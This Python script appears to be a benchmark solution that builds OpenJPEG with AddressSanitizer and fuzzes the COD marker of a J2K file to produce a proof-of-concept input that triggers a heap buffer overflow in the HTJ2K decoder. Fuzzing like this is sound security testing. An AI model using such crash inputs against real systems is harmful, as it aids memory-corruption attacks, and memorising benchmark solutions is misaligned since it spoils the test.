import os
import sys
import tarfile
import subprocess
import tempfile
import shutil
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Create a temporary directory for the workspace
        base_dir = tempfile.mkdtemp()
        
        try:
            # Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(path=base_dir)
            
            # Find the extracted source directory
            src_root = base_dir
            for root, dirs, files in os.walk(base_dir):
                if "CMakeLists.txt" in files:
                    src_root = root
                    break
            
            # Build directory
            build_dir = os.path.join(src_root, "build")
            os.makedirs(build_dir, exist_ok=True)
            
            # Configure environment for ASAN to detect heap overflow
            env = os.environ.copy()
            env["CFLAGS"] = "-fsanitize=address -g"
            env["CXXFLAGS"] = "-fsanitize=address -g"
            
            # Compile OpenJPEG tools
            # We assume cmake and make are available
            subprocess.run(
                ["cmake", "-DBUILD_SHARED_LIBS=OFF", "-DBUILD_CODEC=ON", ".."],
                cwd=build_dir,
                env=env,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            subprocess.run(
                ["make", "-j8", "opj_decompress", "opj_compress"],
                cwd=build_dir,
                env=env,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            opj_decompress = None
            opj_compress = None
            
            # Find binaries
            for root, dirs, files in os.walk(build_dir):
                if "opj_decompress" in files:
                    opj_decompress = os.path.join(root, "opj_decompress")
                if "opj_compress" in files:
                    opj_compress = os.path.join(root, "opj_compress")
            
            if not opj_decompress or not opj_compress:
                return b""

            # Generate Seed
            pgm_path = os.path.join(base_dir, "seed.pgm")
            seed_j2k = os.path.join(base_dir, "seed.j2k")
            
            # Create a small 64x64 PGM image with random noise
            with open(pgm_path, "wb") as f:
                f.write(b"P5\n64 64\n255\n")
                f.write(os.urandom(64 * 64))
            
            # Compress to J2K to use as seed
            subprocess.run(
                [opj_compress, "-i", pgm_path, "-o", seed_j2k],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            with open(seed_j2k, "rb") as f:
                seed_data = bytearray(f.read())
                
            # Fuzzing Loop
            # Target: Heap Buffer Overflow in HT_DEC (HTJ2K decoder)
            
            start_time = time.time()
            timeout = 300 # 5 minutes max
            
            out_path = os.path.join(base_dir, "out.bmp")
            poc_data = b""
            iteration = 0
            
            while time.time() - start_time < timeout:
                iteration += 1
                
                # Create mutation
                mutated = bytearray(seed_data)
                
                # Mutation Strategy
                # We specifically target the COD marker (FF 52) to trigger HTJ2K paths or block sizing errors
                if random.random() < 0.7:
                    cod_locs = []
                    for i in range(len(mutated) - 1):
                        if mutated[i] == 0xFF and mutated[i+1] == 0x52:
                            cod_locs.append(i)
                    
                    if cod_locs:
                        idx = random.choice(cod_locs)
                        # COD Marker: FF 52 Ls(2) Scod(1) SGcod(4) SPcod(5+)
                        # SPcod starts at offset +9
                        # Structure of SPcod:
                        # +0: Decomp levels
                        # +1: Code-block width exp
                        # +2: Code-block height exp
                        # +3: Code-block style
                        # +4: Transformation
                        
                        spcod_offset = idx + 9
                        if spcod_offset + 4 < len(mutated):
                            choice = random.randint(0, 3)
                            if choice == 0:
                                # Set HTJ2K bit in style (0x40 is often HT, or mix bits)
                                mutated[spcod_offset + 3] |= 0x40
                            elif choice == 1:
                                # Mutate block dimensions (exponents)
                                # Large values can trigger overflow in size calculation
                                mutated[spcod_offset + 1] = random.randint(4, 30) 
                                mutated[spcod_offset + 2] = random.randint(4, 30)
                            elif choice == 2:
                                # Randomize style byte
                                mutated[spcod_offset + 3] = random.randint(0, 255)
                            elif choice == 3:
                                # Mutate SGcod fields
                                mutated[idx + 5 + random.randint(0, 3)] = random.randint(0, 255)
                else:
                    # Generic fuzzing
                    num_flips = random.randint(1, 6)
                    for _ in range(num_flips):
                        pos = random.randint(0, len(mutated) - 1)
                        mutated[pos] = random.randint(0, 255)

                # Write test case
                test_path = os.path.join(base_dir, f"test_{iteration}.j2k")
                with open(test_path, "wb") as f:
                    f.write(mutated)
                
                # Run decompress
                proc = subprocess.run(
                    [opj_decompress, "-i", test_path, "-o", out_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    cwd=base_dir
                )
                
                # Check for crash
                if proc.returncode != 0:
                    stderr_out = proc.stderr.decode(errors='ignore')
                    # We are looking specifically for heap buffer overflow reported by ASAN
                    if "AddressSanitizer" in stderr_out and "heap-buffer-overflow" in stderr_out:
                        poc_data = bytes(mutated)
                        break
                    
                    # Fallback detection if ASAN is active but message varies, or raw segfault
                    if "AddressSanitizer" in stderr_out or proc.returncode == -11 or proc.returncode == 139:
                        # Keep it as a candidate, but prefer specific overflow confirmation
                        if not poc_data:
                            poc_data = bytes(mutated)
                            # If we see explicit ASAN, break. If just crash, maybe keep trying briefly?
                            # For safety, return first crash.
                            break

                try:
                    os.remove(test_path)
                except: pass
            
            return poc_data

        except Exception:
            return b""
        finally:
            shutil.rmtree(base_dir, ignore_errors=True)